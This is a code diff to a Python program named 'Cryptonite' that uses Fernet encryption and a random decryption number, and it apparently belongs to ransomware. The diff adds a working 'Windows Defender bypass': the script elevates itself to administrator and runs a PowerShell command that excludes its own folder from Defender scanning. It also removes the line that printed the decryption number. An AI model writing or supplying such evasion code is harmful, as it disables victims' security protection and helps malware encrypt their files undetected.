@@ -1,4 +1,7 @@
 # imports
+import subprocess
+import sys
+import win32com.shell.shell as shell
 import os
 from cryptography.fernet import Fernet
 import random
@@ -10,13 +13,25 @@ import tqdm
 import pymsgbox._native_win as pymsgbox
 import pymsgbox as pmb
 
+# ----------------> Windows Defender bypass script <---------------- #
+
+PATH = os.path.abspath(".")
+ASADMIN = 'asadmin'
+
+if sys.argv[-1] != ASADMIN:                                                             # checks whether we have admin access
+    script = os.path.abspath(sys.argv[0])
+    params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
+    shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)
+
+subprocess.call(f"powershell.exe -Command Add-MpPreference -ExclusionPath {PATH}")      # adds an exclusion for the current folder
+
+
+# ----------------> Cryptonite program begins here. <---------------- #
 
 key = Fernet.generate_key()
 fe = Fernet(key)
 dkrpt = random.randint(100000, 999999)
 uniqKey = str(datetime.now().time()).strip().replace(':', '').replace('.', '')
-print(dkrpt)
-
 
 # some GLOBALS
 
